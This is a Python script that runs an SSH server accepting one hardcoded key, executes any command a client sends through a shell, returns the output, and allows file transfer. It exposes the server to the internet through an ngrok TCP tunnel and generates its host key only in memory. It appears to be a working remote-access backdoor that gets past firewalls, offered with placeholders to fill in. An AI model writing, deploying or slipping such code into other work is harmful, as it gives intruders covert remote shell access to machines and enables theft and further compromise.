import asyncio
import asyncssh
import sys
import subprocess

from pyngrok import ngrok

# Hardcoded id_rsa.pub (generated with gen_rsa.py)
pub_key = "INSERT_YOUR_PUB_KEY"
authorized_key = asyncssh.import_authorized_keys(pub_key)

# Generate a new ssh rsa key in RAM every time the script starts
server_key = asyncssh.generate_private_key('ssh-rsa')
private_key = server_key.export_private_key('openssh')


def ngrok_tunnel():
    # Open a TCP tunnel through ngrok
    global tunnels
    token = "INSERT_YOUR_AUTH_TOKEN"
    ngrok.set_auth_token(token)
    ssh_tunnel = ngrok.connect(8022, "tcp")
    tunnels = ngrok.get_tunnels()



async def handle_client(process: asyncssh.SSHServerProcess) -> None:
    #client_ip = process.get_extra_info('peername')[0]
    process.stdout.write(f'\n{tunnels}\n')
    process.stdout.write(f'[+] Executing command: {process.command}\n')
    
    # execute process.command in a subprocess and capture the output
    try:
        output = subprocess.check_output(process.command, shell=True, stderr=subprocess.STDOUT)
        process.stdout.write(f'[+] Command executed successfully!\n\n{output.decode()}\n')
    except subprocess.CalledProcessError as e:
        process.stdout.write(f'[FAIL] Command returned non-zero exit status: {e.returncode}\n')
        process.stdout.write(f'[+] Error output: {e.output.decode()}\n')
    
    await process.stdout.drain()  # Ensure output is sent to the client
    process.exit(0)



async def start_server() -> None:
    await asyncssh.listen('127.0.0.1',
                          8022,
                          server_host_keys=private_key,
                          authorized_client_keys=authorized_key,
                          sftp_factory=True,
                          allow_scp=True,
                          process_factory=handle_client)

loop = asyncio.get_event_loop()

try:
    # Start the server
    loop.run_until_complete(start_server())
    # Start the ngrok tunnel
    ngrok_tunnel()
except (OSError, asyncssh.Error) as exc:
    sys.exit('[+] Error: ' + str(exc))

loop.run_forever()
